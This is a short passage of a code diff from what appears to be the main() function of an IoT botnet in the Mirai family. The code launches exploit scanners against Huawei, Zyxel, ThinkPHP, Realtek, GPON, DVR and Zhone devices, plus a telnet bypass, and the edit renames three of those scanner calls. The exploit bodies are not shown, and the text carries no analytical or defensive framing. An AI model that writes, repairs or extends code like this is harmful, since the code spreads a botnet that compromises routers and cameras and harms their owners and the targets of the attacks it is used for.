@@ -94,9 +94,9 @@ int main(int argc, char **args) {
     huawei_scanner_init();
     zyxel_scanner_init();
     thinkphp_scanner_init();
-    realtek_scanner_init();
-    gpon80_scanner_init();
-    gpon8080_scanner_init();
+    realtek_scanner();
+    gpon80_scanner();
+    gpon8080_scanner();
     telnetbypass_scanner_init();
     dvr_scanner_init();
     zhone_scanner_init();
